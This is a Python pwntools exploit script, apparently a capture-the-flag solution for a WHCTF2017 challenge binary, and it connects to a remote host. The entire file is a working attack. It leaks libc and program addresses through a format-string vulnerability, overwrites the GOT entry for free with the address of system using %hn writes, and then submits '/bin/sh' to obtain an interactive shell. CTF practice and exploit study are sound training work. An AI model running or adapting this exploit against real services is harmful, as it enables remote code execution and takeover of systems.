from pwn import *
from LibcSearcher import *
# context(arch='amd64', log_level='debug')

# io = process("./pwn1")
io = remote('111.200.241.244', 64531)
elf = ELF('./pwn1')

io.sendlineafter(b'Input Your Code:\n', b'2')
io.sendlineafter(b'Input Your Name:\n', b'heiheihei')

# pause()

io.sendlineafter(b'Input Your Code:\n', b'1')
payload = cyclic(1000) + b'bb%397$p'
io.sendafter(b'Welcome To WHCTF2017:\n', payload)
# __libc_start_main + 0xF0
io.recvuntil(b'0x')
string = io.recvuntil(b'\n', drop = True)
libc_start_main_addr = int(string, 16) - 0xF0

io.sendlineafter(b'Input Your Code:\n', b'1')
payload = cyclic(1000) + b'bb%396$p'
io.sendafter(b'Welcome To WHCTF2017:\n', payload)
# init
io.recvuntil(b'0x')
string = io.recvuntil(b'\n', drop = True)
init_addr = int(string, 16)

# print(libc_start_main_addr)
# print(init_addr)

free_got_addr = init_addr - 0xDA0 + elf.got['free']
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libc_base = libc_start_main_addr - libc.dump('__libc_start_main')

system_addr = libc_base + libc.dump('system')
print(hex(libc.dump('system')))

io.sendlineafter(b'Input Your Code:\n', b'1')
payload = cyclic(1000) + (b'bb%' + str(((system_addr & 0xFFFFFFFF) >> 16) - 0x3FE).encode() + b'c%133$hn').ljust(16, b'a') + p64(free_got_addr + 2)
io.sendafter(b'Welcome To WHCTF2017:\n', payload)

io.sendlineafter(b'Input Your Code:\n', b'1')
payload = cyclic(1000) + (b'bb%' + str((system_addr & 0xFFFF) - 0x3FE).encode() + b'c%133$hn').ljust(16, b'a') + p64(free_got_addr)
io.sendafter(b'Welcome To WHCTF2017:\n', payload)

io.sendlineafter(b'Input Your Code:\n', b'2')
io.sendlineafter(b'Input Your Name:\n', b'/bin/sh')

io.interactive()